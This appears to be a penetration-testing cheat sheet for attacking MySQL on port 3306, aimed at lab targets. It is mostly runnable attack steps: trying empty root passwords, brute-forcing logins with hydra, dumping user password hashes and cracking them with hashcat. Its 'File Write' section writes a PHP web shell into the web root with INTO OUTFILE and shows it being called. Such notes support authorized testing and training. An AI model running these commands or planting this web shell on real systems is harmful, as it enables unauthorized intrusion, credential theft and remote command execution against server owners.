# MySQL (3306)

!!! tip "Start here"
    Try root with no password first: `mysql -h 10.10.10.10 -u root` (no `-p` flag). Many dev and staging instances have no root password set. If you get in and the user has `FILE` privilege, you can write a web shell directly to the web root.

---

## Enumeration

```bash
nmap -p 3306 --script mysql-info,mysql-users,mysql-databases 10.10.10.10
```

---

## Authentication

```bash
mysql -h 10.10.10.10 -u root
mysql -h 10.10.10.10 -u root -p
```

!!! tip ""
    If you get a TLS error, add `--ssl-mode=DISABLED` (MySQL 5.7+) or `--skip-ssl` (MariaDB).

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt mysql://10.10.10.10
```

---

## Enumeration Queries

```sql
SELECT user, host FROM mysql.user;                          -- list users
SHOW GRANTS FOR 'root'@'localhost';                        -- check privileges
SHOW databases;
USE database_name; SHOW tables;
SELECT * FROM table_name;
SELECT host, user, authentication_string FROM mysql.user;  -- dump password hashes
```

---

## File Write (FILE Privilege)

If the MySQL user has `FILE` privilege, write a web shell:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Access at `http://10.10.10.10/shell.php?cmd=id`.

Dump a table to disk:

```sql
SELECT * INTO OUTFILE '/tmp/dump.txt' FROM table_name;
```

---

## Hash Cracking

```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

!!! tip "Real-world"
    Remote MySQL exposure is almost always a misconfiguration — it's supposed to be localhost-only. When you find it, check `FILE` and `EXECUTE` privileges immediately. `FILE` gives you LFI/write; UDF exploitation via `EXECUTE` is a path to OS-level RCE but requires uploading a shared library.
